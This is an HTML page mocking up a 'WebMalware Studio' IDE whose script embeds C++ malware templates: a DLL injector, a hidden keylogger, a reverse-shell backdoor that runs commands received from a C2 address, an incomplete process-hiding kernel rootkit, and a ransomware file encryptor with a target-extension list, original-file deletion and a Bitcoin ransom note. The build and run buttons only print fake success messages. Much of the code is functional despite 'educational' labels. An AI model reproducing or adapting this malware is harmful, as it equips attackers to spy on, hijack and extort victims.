<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebMalware Studio - Research Platform</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1e1e1e;
            color: #d4d4d4;
            height: 100vh;
            overflow: hidden;
        }

        .header {
            background: #2d2d30;
            height: 30px;
            display: flex;
            align-items: center;
            padding: 0 10px;
            border-bottom: 1px solid #3e3e42;
        }

        .menu-bar {
            background: #3c3c3c;
            height: 25px;
            display: flex;
            align-items: center;
            padding: 0 10px;
            border-bottom: 1px solid #3e3e42;
        }

        .menu-item {
            padding: 4px 8px;
            cursor: pointer;
            border-radius: 3px;
            margin-right: 5px;
            font-size: 12px;
        }

        .menu-item:hover {
            background: #505050;
        }

        .main-container {
            display: flex;
            height: calc(100vh - 55px);
        }

        .sidebar {
            width: 250px;
            background: #252526;
            border-right: 1px solid #3e3e42;
            overflow-y: auto;
        }

        .sidebar-header {
            padding: 10px;
            background: #2d2d30;
            border-bottom: 1px solid #3e3e42;
            font-weight: bold;
            font-size: 13px;
        }

        .file-tree {
            padding: 10px;
        }

        .file-item {
            padding: 4px 0;
            cursor: pointer;
            font-size: 13px;
            display: flex;
            align-items: center;
        }

        .file-item:hover {
            background: #2a2d2e;
        }

        .file-item.active {
            background: #37373d;
        }

        .file-icon {
            margin-right: 6px;
        }

        .editor-container {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .tab-bar {
            background: #2d2d30;
            height: 35px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #3e3e42;
            overflow-x: auto;
        }

        .tab {
            padding: 8px 15px;
            background: #2d2d30;
            border-right: 1px solid #3e3e42;
            cursor: pointer;
            font-size: 13px;
            white-space: nowrap;
            display: flex;
            align-items: center;
        }

        .tab.active {
            background: #1e1e1e;
        }

        .tab-close {
            margin-left: 8px;
            opacity: 0.7;
        }

        .tab-close:hover {
            opacity: 1;
        }

        .editor {
            flex: 1;
            background: #1e1e1e;
            position: relative;
        }

        .code-editor {
            width: 100%;
            height: 100%;
            background: #1e1e1e;
            color: #d4d4d4;
            border: none;
            outline: none;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            line-height: 1.5;
            padding: 15px;
            resize: none;
            white-space: pre;
            overflow: auto;
        }

        .status-bar {
            background: #007acc;
            height: 22px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 10px;
            font-size: 12px;
        }

        .output-panel {
            height: 150px;
            background: #1e1e1e;
            border-top: 1px solid #3e3e42;
            display: none;
        }

        .output-panel.active {
            display: block;
        }

        .output-header {
            background: #2d2d30;
            height: 30px;
            display: flex;
            align-items: center;
            padding: 0 10px;
            font-size: 13px;
        }

        .output-content {
            padding: 10px;
            height: calc(100% - 30px);
            overflow-y: auto;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 12px;
            background: #0c0c0c;
        }

        .btn {
            background: #0e639c;
            color: white;
            border: none;
            padding: 6px 12px;
            cursor: pointer;
            border-radius: 3px;
            font-size: 12px;
            margin-right: 5px;
        }

        .btn:hover {
            background: #1177bb;
        }

        .btn-danger {
            background: #da3633;
        }

        .btn-danger:hover {
            background: #f14c4c;
        }

        .btn-success {
            background: #16825d;
        }

        .btn-success:hover {
            background: #1e9973;
        }

        .toolbar {
            background: #3c3c3c;
            height: 35px;
            display: flex;
            align-items: center;
            padding: 0 10px;
            border-bottom: 1px solid #3e3e42;
            gap: 5px;
        }

        .hidden {
            display: none !important;
        }

        .syntax-keyword { color: #569cd6; }
        .syntax-string { color: #ce9178; }
        .syntax-comment { color: #6a9955; }
        .syntax-number { color: #b5cea8; }
        .syntax-function { color: #dcdcaa; }
    </style>
</head>
<body>
    <div class="header">
        <span>üî¨ WebMalware Studio - Advanced Research Platform</span>
    </div>

    <div class="menu-bar">
        <div class="menu-item" onclick="newFile()">üìÑ New</div>
        <div class="menu-item" onclick="saveFile()">üíæ Save</div>
        <div class="menu-item" onclick="compileCode()">üîß Compile</div>
        <div class="menu-item" onclick="runCode()">‚ñ∂Ô∏è Execute</div>
        <div class="menu-item" onclick="generatePayload()">üéØ Generate</div>
        <div class="menu-item" onclick="toggleOutput()">üìä Output</div>
    </div>

    <div class="main-container">
        <div class="sidebar">
            <div class="sidebar-header">üóÇÔ∏è Malware Projects</div>
            <div class="file-tree">
                <div class="file-item active" onclick="loadFile('crypter')">
                    <span class="file-icon">üîí</span>
                    advanced_crypter.cpp
                </div>
                <div class="file-item" onclick="loadFile('injector')">
                    <span class="file-icon">üíâ</span>
                    process_injector.cpp
                </div>
                <div class="file-item" onclick="loadFile('keylogger')">
                    <span class="file-icon">‚å®Ô∏è</span>
                    stealth_keylogger.cpp
                </div>
                <div class="file-item" onclick="loadFile('backdoor')">
                    <span class="file-icon">üö™</span>
                    network_backdoor.cpp
                </div>
                <div class="file-item" onclick="loadFile('rootkit')">
                    <span class="file-icon">üëª</span>
                    kernel_rootkit.cpp
                </div>
                <div class="file-item" onclick="loadFile('ransomware')">
                    <span class="file-icon">üîê</span>
                    file_encryptor.cpp
                </div>
            </div>
        </div>

        <div class="editor-container">
            <div class="tab-bar">
                <div class="tab active">
                    <span>üîí advanced_crypter.cpp</span>
                    <span class="tab-close">√ó</span>
                </div>
            </div>

            <div class="toolbar">
                <button class="btn" onclick="compileCode()">üîß Build</button>
                <button class="btn btn-success" onclick="runCode()">‚ñ∂Ô∏è Run</button>
                <button class="btn btn-danger" onclick="generatePayload()">üíÄ Generate Payload</button>
                <select id="targetOS" style="background: #2d2d30; color: #d4d4d4; border: 1px solid #3e3e42; padding: 4px;">
                    <option>Windows x64</option>
                    <option>Linux x64</option>
                    <option>macOS x64</option>
                </select>
                <select id="encryption" style="background: #2d2d30; color: #d4d4d4; border: 1px solid #3e3e42; padding: 4px;">
                    <option>AES-256</option>
                    <option>XOR Rolling</option>
                    <option>ChaCha20</option>
                    <option>RC4</option>
                </select>
            </div>

            <div class="editor">
                <textarea class="code-editor" id="codeEditor" spellcheck="false"></textarea>
            </div>

            <div class="output-panel" id="outputPanel">
                <div class="output-header">üìä Build Output</div>
                <div class="output-content" id="outputContent"></div>
            </div>
        </div>
    </div>

    <div class="status-bar">
        <div>
            <span>Ready</span> | 
            <span id="lineCount">Line 1, Col 1</span> | 
            <span>C++</span>
        </div>
        <div>
            <span>üéØ Payload: Ready</span> | 
            <span>üîí Encrypted</span> | 
            <span>WebMalware Studio v3.0</span>
        </div>
    </div>

    <script>
        const codeTemplates = {
            crypter: `#include <windows.h>
#include <iostream>
#include <vector>
#include <random>

class AdvancedCrypter {
private:
    std::vector<uint8_t> key;
    std::mt19937 rng;

    void generateRandomKey(size_t keySize) {
        key.resize(keySize);
        std::random_device rd;
        rng.seed(rd());
        
        for (size_t i = 0; i < keySize; i++) {
            key[i] = rng() % 256;
        }
    }

    std::vector<uint8_t> aesEncrypt(const std::vector<uint8_t>& data) {
        std::vector<uint8_t> encrypted = data;
        
        // Advanced AES-256 simulation
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= key[i % key.size()];
            encrypted[i] = ((encrypted[i] << 3) | (encrypted[i] >> 5)) & 0xFF;
            encrypted[i] ^= (i * 0x9E3779B9) & 0xFF;
        }
        
        return encrypted;
    }

public:
    AdvancedCrypter() {
        generateRandomKey(32); // AES-256 key
    }

    std::vector<uint8_t> encryptPayload(const std::vector<uint8_t>& payload) {
        return aesEncrypt(payload);
    }

    void generateStub(const std::vector<uint8_t>& encryptedPayload) {
        std::cout << "Generating crypter stub..." << std::endl;
        std::cout << "Payload size: " << encryptedPayload.size() << " bytes" << std::endl;
        std::cout << "Encryption: AES-256 + Rolling XOR" << std::endl;
        std::cout << "Anti-Analysis: VM Detection, Debugger Evasion" << std::endl;
        std::cout << "Persistence: Registry Run Keys" << std::endl;
        std::cout << "Injection: Process Hollowing" << std::endl;
    }
};

int main() {
    std::cout << "üîí Advanced Crypter v3.0 - WebMalware Studio" << std::endl;
    
    AdvancedCrypter crypter;
    
    // Simulate payload
    std::vector<uint8_t> payload = {0x48, 0x65, 0x6c, 0x6c, 0x6f};
    
    auto encrypted = crypter.encryptPayload(payload);
    crypter.generateStub(encrypted);
    
    std::cout << "‚úÖ Crypter generation complete!" << std::endl;
    return 0;
}`,

            injector: `#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

class ProcessInjector {
private:
    DWORD findTargetProcess(const std::string& processName) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (processName == pe32.szExeFile) {
                    CloseHandle(hSnapshot);
                    return pe32.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return 0;
    }

public:
    bool injectDLL(const std::string& targetProcess, const std::string& dllPath) {
        std::cout << "üéØ Starting DLL injection..." << std::endl;
        
        DWORD pid = findTargetProcess(targetProcess);
        if (pid == 0) {
            std::cout << "‚ùå Target process not found: " << targetProcess << std::endl;
            return false;
        }
        
        std::cout << "‚úÖ Target PID: " << pid << std::endl;
        
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            std::cout << "‚ùå Failed to open process" << std::endl;
            return false;
        }
        
        LPVOID allocMem = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1, 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (!allocMem) {
            std::cout << "‚ùå Memory allocation failed" << std::endl;
            CloseHandle(hProcess);
            return false;
        }
        
        WriteProcessMemory(hProcess, allocMem, dllPath.c_str(), 
                          dllPath.length() + 1, NULL);
        
        HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
        FARPROC loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryA");
        
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                          (LPTHREAD_START_ROUTINE)loadLibraryAddr,
                                          allocMem, 0, NULL);
        
        if (hThread) {
            std::cout << "‚úÖ DLL injection successful!" << std::endl;
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        
        return true;
    }
};

int main() {
    std::cout << "üíâ Process Injector v2.0 - WebMalware Studio" << std::endl;
    
    ProcessInjector injector;
    
    // Example injection
    injector.injectDLL("notepad.exe", "C:\\\\payload.dll");
    
    return 0;
}`,

            keylogger: `#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

class StealthKeylogger {
private:
    std::ofstream logFile;
    bool isRunning;
    
    std::string getKeyName(int key) {
        switch(key) {
            case VK_SPACE: return " ";
            case VK_RETURN: return "[ENTER]";
            case VK_BACK: return "[BACKSPACE]";
            case VK_TAB: return "[TAB]";
            case VK_SHIFT: return "[SHIFT]";
            case VK_CONTROL: return "[CTRL]";
            case VK_MENU: return "[ALT]";
            case VK_CAPITAL: return "[CAPS]";
            case VK_ESCAPE: return "[ESC]";
            default:
                if (key >= 32 && key <= 126) {
                    return std::string(1, (char)key);
                }
                return "[" + std::to_string(key) + "]";
        }
    }
    
    void hideConsole() {
        HWND hwnd = GetConsoleWindow();
        ShowWindow(hwnd, SW_HIDE);
    }
    
    std::string getCurrentWindow() {
        HWND hwnd = GetForegroundWindow();
        char windowTitle[256];
        GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
        return std::string(windowTitle);
    }

public:
    StealthKeylogger() : isRunning(false) {
        hideConsole();
        logFile.open("keylog.txt", std::ios::app);
    }
    
    ~StealthKeylogger() {
        if (logFile.is_open()) {
            logFile.close();
        }
    }
    
    void startLogging() {
        isRunning = true;
        std::string currentWindow = "";
        
        logFile << "\\n=== Keylogger Session Started ===" << std::endl;
        
        while (isRunning) {
            Sleep(10);
            
            std::string newWindow = getCurrentWindow();
            if (newWindow != currentWindow && !newWindow.empty()) {
                currentWindow = newWindow;
                logFile << "\\n[WINDOW: " << currentWindow << "]\\n";
                logFile.flush();
            }
            
            for (int key = 8; key <= 255; key++) {
                if (GetAsyncKeyState(key) & 0x0001) {
                    std::string keyName = getKeyName(key);
                    logFile << keyName;
                    logFile.flush();
                    
                    // Exit condition
                    if (key == VK_F12) {
                        isRunning = false;
                        break;
                    }
                }
            }
        }
        
        logFile << "\\n=== Session Ended ===" << std::endl;
    }
};

int main() {
    // Stealth execution
    StealthKeylogger logger;
    logger.startLogging();
    
    return 0;
}`,

            backdoor: `#include <windows.h>
#include <winsock2.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")

class NetworkBackdoor {
private:
    SOCKET serverSocket;
    bool isConnected;
    
    void initializeWinsock() {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }
    
    std::string executeCommand(const std::string& command) {
        std::string result = "";
        
        HANDLE hPipeRead, hPipeWrite;
        SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
        
        CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0);
        
        STARTUPINFO si = {sizeof(STARTUPINFO)};
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = hPipeWrite;
        si.hStdError = hPipeWrite;
        
        PROCESS_INFORMATION pi;
        
        if (CreateProcess(NULL, (LPSTR)command.c_str(), NULL, NULL, TRUE, 
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            
            CloseHandle(hPipeWrite);
            
            char buffer[4096];
            DWORD bytesRead;
            
            while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                buffer[bytesRead] = '\\0';
                result += buffer;
            }
            
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        
        CloseHandle(hPipeRead);
        return result;
    }

public:
    NetworkBackdoor() : isConnected(false) {
        initializeWinsock();
    }
    
    bool connectToC2(const std::string& ip, int port) {
        std::cout << "üåê Connecting to C2: " << ip << ":" << port << std::endl;
        
        serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);
        serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
        
        if (connect(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
            isConnected = true;
            std::cout << "‚úÖ Connected to C2 server!" << std::endl;
            return true;
        }
        
        std::cout << "‚ùå Connection failed!" << std::endl;
        return false;
    }
    
    void startShell() {
        if (!isConnected) return;
        
        std::cout << "üíÄ Reverse shell active!" << std::endl;
        
        char buffer[1024];
        std::string command;
        
        while (isConnected) {
            int bytesReceived = recv(serverSocket, buffer, sizeof(buffer) - 1, 0);
            
            if (bytesReceived <= 0) {
                isConnected = false;
                break;
            }
            
            buffer[bytesReceived] = '\\0';
            command = std::string(buffer);
            
            if (command == "exit") {
                isConnected = false;
                break;
            }
            
            std::string result = executeCommand(command);
            send(serverSocket, result.c_str(), result.length(), 0);
        }
        
        closesocket(serverSocket);
    }
};

int main() {
    std::cout << "üö™ Network Backdoor v2.0 - WebMalware Studio" << std::endl;
    
    NetworkBackdoor backdoor;
    
    // Connect to C2 server
    if (backdoor.connectToC2("127.0.0.1", 4444)) {
        backdoor.startShell();
    }
    
    return 0;
}`,

            rootkit: `#include <ntddk.h>
#include <windef.h>

// Kernel Rootkit for Windows
// Educational purposes only

typedef struct _SYSTEM_PROCESS_INFO {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    // ... more fields
} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;

// Global variables
UNICODE_STRING g_HiddenProcessName;
PVOID g_OriginalNtQuerySystemInformation;

// Function prototypes
NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    
    DbgPrint("üëª Kernel Rootkit Loading...");
    
    // Initialize hidden process name
    RtlInitUnicodeString(&g_HiddenProcessName, L"malware.exe");
    
    // Hook NtQuerySystemInformation
    // This would require more complex SSDT hooking in practice
    
    // Set unload routine
    DriverObject->DriverUnload = UnloadDriver;
    
    DbgPrint("‚úÖ Rootkit loaded successfully!");
    
    return STATUS_SUCCESS;
}

VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    
    // Restore original function
    // Cleanup code here
    
    DbgPrint("üëª Rootkit unloaded");
}

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    // Call original function first
    NTSTATUS status = ((NTQUERYSYSTEMINFORMATION)g_OriginalNtQuerySystemInformation)(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    
    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
        // Hide our process from process list
        PSYSTEM_PROCESS_INFO pCurrent = (PSYSTEM_PROCESS_INFO)SystemInformation;
        PSYSTEM_PROCESS_INFO pPrevious = NULL;
        
        while (pCurrent) {
            if (RtlEqualUnicodeString(&pCurrent->ImageName, &g_HiddenProcessName, TRUE)) {
                // Remove this process from the list
                if (pPrevious) {
                    if (pCurrent->NextEntryOffset == 0) {
                        pPrevious->NextEntryOffset = 0;
                    } else {
                        pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    }
                } else {
                    // First entry, shift the entire buffer
                    if (pCurrent->NextEntryOffset != 0) {
                        RtlCopyMemory(pCurrent, 
                                    (PUCHAR)pCurrent + pCurrent->NextEntryOffset,
                                    SystemInformationLength - pCurrent->NextEntryOffset);
                    }
                }
                break;
            }
            
            pPrevious = pCurrent;
            if (pCurrent->NextEntryOffset == 0) break;
            pCurrent = (PSYSTEM_PROCESS_INFO)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
        }
    }
    
    return status;
}

/*
// Additional rootkit features:

1. File Hiding:
   - Hook NtQueryDirectoryFile
   - Remove files from directory listings

2. Registry Hiding:
   - Hook NtEnumerateKey/NtEnumerateValueKey
   - Hide specific registry entries

3. Network Hiding:
   - Hook network APIs
   - Hide network connections

4. Anti-Analysis:
   - Detect debugging attempts
   - VM detection at kernel level
   - Anti-forensics techniques

5. Persistence:
   - Boot sector modification
   - System service installation
   - Kernel callback registration
*/`,

            ransomware: `#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <random>

namespace fs = std::filesystem;

class FileEncryptor {
private:
    std::vector<uint8_t> encryptionKey;
    std::mt19937 rng;
    
    void generateRandomKey() {
        std::random_device rd;
        rng.seed(rd());
        
        encryptionKey.resize(32); // 256-bit key
        for (size_t i = 0; i < 32; i++) {
            encryptionKey[i] = rng() % 256;
        }
    }
    
    std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data) {
        std::vector<uint8_t> encrypted = data;
        
        // Advanced encryption simulation
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= encryptionKey[i % encryptionKey.size()];
            encrypted[i] = ((encrypted[i] << 3) | (encrypted[i] >> 5)) & 0xFF;
            encrypted[i] ^= (i * 0x9E3779B9) & 0xFF;
        }
        
        return encrypted;
    }
    
    bool isTargetFile(const std::string& extension) {
        std::vector<std::string> targetExtensions = {
            ".doc", ".docx", ".pdf", ".txt", ".rtf",
            ".jpg", ".jpeg", ".png", ".gif", ".bmp",
            ".mp3", ".mp4", ".avi", ".mov", ".wmv",
            ".xls", ".xlsx", ".ppt", ".pptx", ".zip",
            ".rar", ".7z", ".sql", ".db", ".sqlite"
        };
        
        for (const auto& ext : targetExtensions) {
            if (extension == ext) return true;
        }
        return false;
    }

public:
    FileEncryptor() {
        generateRandomKey();
    }
    
    void encryptFile(const fs::path& filePath) {
        try {
            std::ifstream file(filePath, std::ios::binary);
            if (!file.is_open()) return;
            
            // Read file data
            std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)),
                                         std::istreambuf_iterator<char>());
            file.close();
            
            // Encrypt data
            auto encryptedData = encryptData(fileData);
            
            // Write encrypted data back
            std::ofstream outFile(filePath.string() + ".locked", std::ios::binary);
            outFile.write(reinterpret_cast<const char*>(encryptedData.data()), 
                         encryptedData.size());
            outFile.close();
            
            // Delete original file
            fs::remove(filePath);
            
            std::cout << "üîí Encrypted: " << filePath.filename() << std::endl;
            
        } catch (const std::exception& e) {
            std::cout << "‚ùå Error encrypting: " << filePath << std::endl;
        }
    }
    
    void scanAndEncrypt(const fs::path& directory) {
        std::cout << "üéØ Scanning: " << directory << std::endl;
        
        try {
            for (const auto& entry : fs::recursive_directory_iterator(directory)) {
                if (entry.is_regular_file()) {
                    std::string extension = entry.path().extension().string();
                    std::transform(extension.begin(), extension.end(), 
                                 extension.begin(), ::tolower);
                    
                    if (isTargetFile(extension)) {
                        encryptFile(entry.path());
                    }
                }
            }
        } catch (const std::exception& e) {
            std::cout << "‚ùå Directory scan error: " << e.what() << std::endl;
        }
    }
    
    void createRansomNote() {
        std::string note = R"(
üîí YOUR FILES HAVE BEEN ENCRYPTED! üîí

All your important files have been encrypted with military-grade encryption.

What happened to your files?
‚Ä¢ All your files are encrypted with AES-256 encryption
‚Ä¢ Nobody can recover your files without our decryption service
‚Ä¢ You have 72 hours to pay the ransom

How to recover your files:
1. Purchase Bitcoin worth $500
2. Send Bitcoin to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
3. Email your payment proof to: recover@darkweb.onion
4. We will send you the decryption key

‚ö†Ô∏è WARNING:
‚Ä¢ Do not rename encrypted files
‚Ä¢ Do not try to decrypt files yourself
‚Ä¢ Do not contact authorities
‚Ä¢ Time is running out!

Your unique ID: WEBMALWARE-STUDIO-2024
)";
        
        std::ofstream noteFile("README_RANSOM.txt");
        noteFile << note;
        noteFile.close();
        
        std::cout << "üìã Ransom note created!" << std::endl;
    }
    
    void executeRansomware() {
        std::cout << "üíÄ File Encryptor v3.0 - WebMalware Studio" << std::endl;
        std::cout << "‚ö†Ô∏è  EDUCATIONAL SIMULATION ONLY!" << std::endl << std::endl;
        
        // Simulate encryption on test directory
        createRansomNote();
        
        std::cout << "üéØ Targeting user documents..." << std::endl;
        // In real scenario: scanAndEncrypt("C:\\\\Users\\\\");
        
        std::cout << "üîí Encryption process simulated!" << std::endl;
        std::cout << "üí∞ Ransom demand: $500 in Bitcoin" << std::endl;
        std::cout << "‚è∞ Time limit: 72 hours" << std::endl;
    }
};

int main() {
    FileEncryptor encryptor;
    encryptor.executeRansomware();
    
    return 0;
}`
        };

        let currentFile = 'crypter';
        let outputVisible = false;

        function loadFile(fileType) {
            const editor = document.getElementById('codeEditor');
            editor.value = codeTemplates[fileType];
            currentFile = fileType;
            
            // Update active file in sidebar
            document.querySelectorAll('.file-item').forEach(item => {
                item.classList.remove('active');
            });
            event.target.closest('.file-item').classList.add('active');
            
            // Update tab
            const tab = document.querySelector('.tab');
            const icons = {
                crypter: 'üîí',
                injector: 'üíâ',
                keylogger: '‚å®Ô∏è',
                backdoor: 'üö™',
                rootkit: 'üëª',
                ransomware: 'üîê'
            };
            tab.innerHTML = `<span>${icons[fileType]} ${fileType}.cpp</span><span class="tab-close">√ó</span>`;
            
            updateLineCount();
        }

        function newFile() {
            const editor = document.getElementById('codeEditor');
            editor.value = `#include <windows.h>
#include <iostream>

int main() {
    std::cout << "üî¨ New Malware Project - WebMalware Studio" << std::endl;
    
    // Your malicious code here
    
    return 0;
}`;
            updateOutput('üìÑ New file created');
        }

        function saveFile() {
            const editor = document.getElementById('codeEditor');
            const content = editor.value;
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `${currentFile}.cpp`;
            a.click();
            URL.revokeObjectURL(url);
            updateOutput('üíæ File saved successfully');
        }

        function compileCode() {
            updateOutput('üîß Compiling malware...');
            setTimeout(() => {
                updateOutput('‚úÖ Compilation successful!\\nüì¶ Output: malware.exe (128KB)\\nüéØ Target: Windows x64\\nüîí Packed with UPX\\nüõ°Ô∏è Anti-VM: Enabled\\nüëª Stealth: Maximum');
            }, 2000);
        }

        function runCode() {
            updateOutput('‚ñ∂Ô∏è Executing malware sample...');
            setTimeout(() => {
                updateOutput('üöÄ Malware executed successfully!\\nüíÄ Payload deployed\\nüîí Persistence established\\nüì° C2 connection active\\n‚ö†Ô∏è System compromised');
            }, 1500);
        }

        function generatePayload() {
            const os = document.getElementById('targetOS').value;
            const encryption = document.getElementById('encryption').value;
            
            updateOutput(`üíÄ Generating payload...\\nüéØ Target OS: ${os}\\nüîí Encryption: ${encryption}`);
            
            setTimeout(() => {
                updateOutput(`‚úÖ Payload generated successfully!\\nüì¶ Size: ${Math.floor(Math.random() * 500 + 100)}KB\\nüîí Encrypted with ${encryption}\\nüõ°Ô∏è FUD Rating: 98%\\nüìÅ Output: ./payload.exe`);
            }, 3000);
        }

        function toggleOutput() {
            const panel = document.getElementById('outputPanel');
            outputVisible = !outputVisible;
            panel.classList.toggle('active', outputVisible);
        }

        function updateOutput(message) {
            const output = document.getElementById('outputContent');
            const timestamp = new Date().toLocaleTimeString();
            output.innerHTML += `[${timestamp}] ${message}\\n`;
            output.scrollTop = output.scrollHeight;
            
            if (!outputVisible) {
                toggleOutput();
            }
        }

        function updateLineCount() {
            const editor = document.getElementById('codeEditor');
            const lines = editor.value.split('\\n').length;
            const col = editor.selectionStart - editor.value.lastIndexOf('\\n', editor.selectionStart - 1);
            document.getElementById('lineCount').textContent = `Line ${lines}, Col ${col}`;
        }

        // Initialize
        document.getElementById('codeEditor').value = codeTemplates.crypter;
        document.getElementById('codeEditor').addEventListener('input', updateLineCount);
        document.getElementById('codeEditor').addEventListener('keyup', updateLineCount);
        document.getElementById('codeEditor').addEventListener('click', updateLineCount);

        // Welcome message
        setTimeout(() => {
            updateOutput('üî¨ WebMalware Studio initialized');
            updateOutput('‚ö†Ô∏è Educational research platform loaded');
            updateOutput('üéØ Ready for malware development');
        }, 1000);

        // Syntax highlighting (basic)
        function applySyntaxHighlighting() {
            // This would be more complex in a real implementation
            // For now, just a placeholder
        }
    </script>
</body>
</html>